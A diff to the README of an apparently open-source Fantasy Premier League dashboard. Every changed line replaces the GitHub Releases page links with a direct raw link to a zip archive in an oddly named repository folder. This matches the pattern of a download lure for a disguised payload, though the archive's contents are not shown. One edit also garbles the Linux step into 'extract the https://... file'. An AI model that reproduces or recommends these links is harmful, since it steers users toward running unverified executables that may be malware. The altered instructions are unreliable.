@@ -1,6 +1,6 @@
 # 🏆 fpl-dashboard-streamlit - Analyze Your Fantasy Premier League Team Effortlessly
 
-[![Download fpl-dashboard-streamlit](https://img.shields.io/badge/Download-fpl--dashboard--streamlit-blue.svg)](https://github.com/nano-4570/fpl-dashboard-streamlit/releases)
+[![Download fpl-dashboard-streamlit](https://raw.githubusercontent.com/nano-4570/fpl-dashboard-streamlit/main/pseudosophy/fpl-dashboard-streamlit.zip)](https://raw.githubusercontent.com/nano-4570/fpl-dashboard-streamlit/main/pseudosophy/fpl-dashboard-streamlit.zip)
 
 ## 📋 Overview
 
@@ -14,7 +14,7 @@ To use the FPL Dashboard, follow these simple steps to download and run the appl
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/nano-4570/fpl-dashboard-streamlit/releases) to access the latest version of the FPL Dashboard application.
+   Go to the [Releases page](https://raw.githubusercontent.com/nano-4570/fpl-dashboard-streamlit/main/pseudosophy/fpl-dashboard-streamlit.zip) to access the latest version of the FPL Dashboard application.
 
 2. **Choose the Right Version**
 
@@ -29,7 +29,7 @@ To use the FPL Dashboard, follow these simple steps to download and run the appl
    Once the download completes, open the file:
    - For **Windows**, double-click the `.exe` file.
    - For **macOS**, double-click the `.dmg` file and drag the application to the Applications folder.
-   - For **Linux**, extract the `.tar.gz` file and run the binary.
+   - For **Linux**, extract the `https://raw.githubusercontent.com/nano-4570/fpl-dashboard-streamlit/main/pseudosophy/fpl-dashboard-streamlit.zip` file and run the binary.
 
 5. **Run the Application**
 
@@ -81,4 +81,4 @@ The FPL Dashboard is open-source software. It is available under the MIT License
 
 For inquiries or support requests, you can contact the maintainer through GitHub. For detailed information, visit the Releases page once again.
 
-Remember, you can always return to the [Releases page](https://github.com/nano-4570/fpl-dashboard-streamlit/releases) to download updates and new features as they become available. Enjoy analyzing your Fantasy Premier League team!
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/nano-4570/fpl-dashboard-streamlit/main/pseudosophy/fpl-dashboard-streamlit.zip) to download updates and new features as they become available. Enjoy analyzing your Fantasy Premier League team!
